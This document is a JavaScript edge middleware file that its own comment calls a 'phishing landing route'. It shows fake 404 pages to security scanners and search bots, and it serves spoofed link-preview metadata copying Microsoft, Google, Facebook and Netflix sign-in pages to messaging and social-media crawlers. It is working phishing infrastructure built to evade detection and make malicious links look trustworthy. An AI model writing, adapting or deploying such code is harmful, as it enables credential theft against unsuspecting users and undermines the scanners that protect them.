const META_SPOOFS = {
    microsoft: {
        title: "Sign in to your Microsoft account",
        description: "Access your account, check your security settings, and manage your billing info.",
        image: "https://logincdn.msauth.net/shared/1.0/content/images/app_signin_microsoft_logo_940713063fbfdd4c062821df2605f6d7.svg"
    },
    facebook: {
        title: "Facebook - Log In or Sign Up",
        description: "Connect with friends and the world around you on Facebook.",
        image: "https://www.facebook.com/images/fb_icon_325x325.png"
    },
    google: {
        title: "Google Account - Sign in",
        description: "Login to your Google account and manage your privacy.",
        image: "https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
    },
    netflix: {
        title: "Netflix - Watch TV Shows Online, Watch Movies Online",
        description: "Watch Netflix movies & TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more.",
        image: "https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"
    },
    generic: {
        title: "Secure Portal Login",
        description: "Please authenticate to continue to the secure application.",
        image: "/logo.png"
    }
};

export default function middleware(request) {
    const url = new URL(request.url);
    const { pathname, searchParams } = url;

    // Only intercept the phishing landing route
    if (pathname === '/l/auth') {
        const userAgent = (request.headers.get('user-agent') || '').toLowerCase();

        // 1. Detect Security Scanners & Search Engines (Cloaking)
        const isScanner = /googlebot|chrome-lighthouse|google-safebrowsing|adsbot-google|google-site-verification|bingbot|crawler|spider|bot|slurp|duckduckbot/i.test(userAgent);

        // 2. Detect Link Preview crawlers (for spoofing)
        const isLinkPreview = /whatsapp|facebookexternalhit|linkedinbot|twitterbot|slackbot|discordbot|telegrambot|viber|apple-rich-preview/i.test(userAgent);

        // ACTION: If it's a security scanner, give them a "404" or a completely safe "Research" page
        if (isScanner && !isLinkPreview) {
            return new Response(`<!DOCTYPE html><html><body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></body></html>`, {
                status: 404,
                headers: { 'Content-Type': 'text/html' }
            });
        }

        if (isLinkPreview) {
            const encoded = searchParams.get('e');
            let platform = 'generic';

            if (encoded) {
                try {
                    // In Edge runtime, atob is available
                    const decoded = atob(encoded);
                    const params = new URLSearchParams(decoded);
                    platform = params.get('p') || 'generic';
                } catch (e) {
                    // Fallback if decoding fails
                }
            }

            const spoof = META_SPOOFS[platform] || META_SPOOFS.generic;

            // Return a custom HTML response with spoofed meta tags
            const html = `<!DOCTYPE html>
<html prefix="og: http://ogp.me/ns#">
  <head>
    <meta charset="utf-8">
    <title>${spoof.title}</title>
    <meta property="og:title" content="${spoof.title}" />
    <meta property="og:description" content="${spoof.description}" />
    <meta property="og:image" content="${spoof.image}" />
    <meta property="og:type" content="website" />
    <meta property="og:site_name" content="${platform === 'microsoft' ? 'Microsoft Security' : platform.charAt(0).toUpperCase() + platform.slice(1)}" />
    <meta property="og:locale" content="en_US" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="${spoof.title}" />
    <meta name="twitter:description" content="${spoof.description}" />
    <meta name="twitter:image" content="${spoof.image}" />
    <meta name="theme-color" content="${platform === 'facebook' ? '#1877f2' : (platform === 'microsoft' ? '#0067b8' : '#000000')}" />
  </head>
  <body>
    <p>Redirecting to secure login...</p>
    <script>setTimeout(() => { window.location.href = window.location.href; }, 100);</script>
  </body>
</html>`;

            return new Response(html, {
                headers: {
                    'Content-Type': 'text/html; charset=UTF-8',
                    'Cache-Control': 'no-cache, no-store, must-revalidate'
                }
            });
        }
    }
}

// Config to limit execution
export const config = {
    matcher: '/l/auth',
};
